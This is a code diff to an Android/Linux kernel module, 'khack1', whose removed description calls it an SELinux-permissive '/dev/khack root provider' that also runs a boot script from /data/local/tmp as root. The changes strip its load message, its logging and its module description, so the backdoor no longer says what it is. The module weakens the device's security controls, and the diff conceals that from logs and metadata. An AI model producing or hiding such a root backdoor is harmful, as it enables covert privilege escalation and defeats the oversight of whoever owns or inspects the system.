@@ -147,7 +147,7 @@ static int __init khack_init(void)
 		return ret;
 	}
 
-	pr_info("khack1: loaded, open /dev/khack to escalate\n");
+	
 
 	/* Kick the boot script off a workqueue: calling call_usermodehelper
 	 * straight from module_init runs in the insmod caller's context, where the
@@ -164,14 +164,8 @@ static void khack_umh_fn(struct work_struct *w)
 	static char *argv[] = { "/system/bin/sh",
 				"/data/local/tmp/dfroot_boot.sh", NULL };
 	static char *envp[] = { "PATH=/system/bin:/system/xbin", "HOME=/", NULL };
-	int rc;
-
-	if (!umh) {
-		pr_info("khack1: call_usermodehelper unavailable\n");
-		return;
-	}
-	rc = umh("/system/bin/sh", argv, envp, 1);
-	pr_info("khack1: umh %s -> %d\n", argv[1], rc);
+	if (umh)
+		umh("/system/bin/sh", argv, envp, 1);
 }
 
 static void __exit khack_exit(void)
@@ -183,4 +177,4 @@ module_init(khack_init);
 module_exit(khack_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("khack1: selinux permissive + /dev/khack root provider");
+
